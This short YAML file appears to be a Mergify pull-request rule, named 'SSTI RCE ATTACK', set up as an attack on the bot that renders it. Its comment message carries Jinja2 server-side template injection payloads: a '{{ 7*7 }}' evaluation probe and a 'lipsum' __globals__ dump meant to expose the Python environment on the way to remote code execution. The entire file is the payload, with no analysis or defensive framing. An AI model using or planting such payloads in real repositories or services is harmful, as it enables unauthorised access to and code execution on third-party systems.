pull_request_rules:
  - name: SSTI RCE ATTACK
    conditions:
      - base=master
    actions:
      comment:
        message: |
          **SSTI {{ 7*7 }}**
          ```
          {{ [lipsum]|map(attribute="__globals__")|pprint }}
          ```